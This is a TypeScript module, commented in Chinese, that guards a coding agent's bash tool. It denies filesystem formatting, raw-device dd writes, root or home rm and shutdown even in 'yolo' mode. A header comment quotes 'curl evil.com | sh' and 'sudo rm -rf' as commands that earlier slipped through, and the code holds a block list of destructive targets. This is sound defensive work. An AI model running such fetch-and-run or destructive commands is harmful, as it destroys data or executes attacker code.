// D1 灾难形态地板（yolo 底线）：bots 建任务强制 yolo 且锁死（taskBridge §6.9），实测
// yolo 对 154/154 条命令全放行（含 curl evil.com | sh 与 sudo rm -rf）。本策略在 yolo
// 全放行前拦下**灾难形态**——拦形态不拦命令名：rm -rf node_modules、chmod +x、
// curl | sh（官方安装方式）等合法高频操作零误伤；清单封闭、无逃生口（清单内形态无
// 合法工作流用途）。
//
// 保守方向裁决：解析失败 / 含动态词（命令替换、变量展开）时**不拦**——模糊匹配的
// 误杀比漏杀更伤信任；界内破坏（rm -rf 指向工作区内部）不归本层，由审批/沙箱负责。
import {
  analyzeBashCommand,
  isBashCommandPermissionSafe,
  type BashCommandInvocation,
} from "./handlers/bash-command-parser.js";

export type CatastrophicBashCategory =
  | "filesystem-format"
  | "raw-device-write"
  | "root-home-delete"
  | "system-shutdown";

export interface CatastrophicBashMatch {
  category: CatastrophicBashCategory;
  /** 命中段的原始文本（bot 侧拒绝原因展示用）。 */
  commandText: string;
  /** 面向模型的拒绝说明（结构化、含被拒原因）。 */
  reason: string;
}

// 前置包装器：sudo/nohup/time 等不改变灾难语义，剥掉后判定主命令。
const WRAPPER_COMMANDS = new Set(["sudo", "nohup", "time", "nice", "command", "builtin"]);

// rm 的"根/家目录级"裸目标形态（归一尾部斜杠后比对）。
const ROOT_LEVEL_RM_TARGETS = new Set([
  "/",
  "/*",
  "/.",
  "/..",
  "~",
  "~/",
  "~/*",
  "$home",
  "$home/*",
  "${home}",
  "${home}/*",
]);

const SHUTDOWN_COMMANDS = new Set(["shutdown", "reboot", "halt", "poweroff"]);
const MKFS_RE = /^mkfs(\..+)?$/;
const SAFE_DD_OUTPUT_DEVICES = new Set(["/dev/null"]);

function basename(value: string): string {
  const lastSlash = value.lastIndexOf("/");
  return lastSlash === -1 ? value : value.slice(lastSlash + 1);
}

/** 解析一段 argv（已剥包装器）是否构成灾难形态。 */
function matchInvocation(invocation: BashCommandInvocation): CatastrophicBashMatch | undefined {
  let argv = invocation.argv;
  while (argv.length > 1 && WRAPPER_COMMANDS.has(basename(argv[0] ?? "").toLowerCase())) {
    argv = argv.slice(1);
  }
  if (argv.length === 0) return undefined;
  const command = basename(argv[0] ?? "");
  const args = argv.slice(1);

  if (MKFS_RE.test(command)) {
    return {
      category: "filesystem-format",
      commandText: invocation.commandText,
      reason: `Formatting a filesystem (${command}) is a catastrophic action and is always denied, even in yolo mode.`,
    };
  }

  if (command === "dd") {
    for (const arg of args) {
      const match = /^(?:of|conv=iflag=.*of)=([^=].*)$/u.exec(arg) ?? /^of=(.+)$/u.exec(arg);
      const target = match?.[1];
      if (target && target.startsWith("/dev/") && !SAFE_DD_OUTPUT_DEVICES.has(target)) {
        return {
          category: "raw-device-write",
          commandText: invocation.commandText,
          reason: `Writing to raw device ${target} with dd is a catastrophic action and is always denied, even in yolo mode.`,
        };
      }
    }
    return undefined;
  }

  if (command === "rm") {
    let targetsStarted = false;
    for (const arg of args) {
      if (!targetsStarted && arg === "--") {
        targetsStarted = true;
        continue;
      }
      if (!targetsStarted && arg.startsWith("-")) continue;
      const normalized = normalizeRmTarget(arg);
      if (ROOT_LEVEL_RM_TARGETS.has(normalized)) {
        return {
          category: "root-home-delete",
          commandText: invocation.commandText,
          reason: `Deleting root or home directory (${arg}) is a catastrophic action and is always denied, even in yolo mode.`,
        };
      }
    }
    return undefined;
  }

  if (SHUTDOWN_COMMANDS.has(command)) {
    return {
      category: "system-shutdown",
      commandText: invocation.commandText,
      reason: `Shutting down or rebooting the machine (${command}) is always denied for agent-initiated commands, even in yolo mode.`,
    };
  }

  return undefined;
}

function normalizeRmTarget(target: string): string {
  const lowercased = target.trim().toLowerCase();
  // 只对长度 >1 的目标剥尾斜杠——"/" 本身就是根，剥掉会变空串漏判。
  if (lowercased.length > 1 && lowercased.endsWith("/")) {
    return lowercased.slice(0, -1);
  }
  return lowercased;
}

/**
 * 判定一条 bash 命令是否含灾难形态。复合命令（管道/&&/;）任一段命中即返回该段；
 * 解析不安全（错误/不支持语法/动态词）返回 undefined——宁可放行给审批/沙箱层，
 * 不用模糊匹配误伤正常命令。
 */
export function findCatastrophicBashCommand(command: string): CatastrophicBashMatch | undefined {
  const analysis = analyzeBashCommand(command);
  if (!isBashCommandPermissionSafe(analysis)) return undefined;
  for (const invocation of analysis.commands) {
    const match = matchInvocation(invocation);
    if (match) return match;
  }
  return undefined;
}
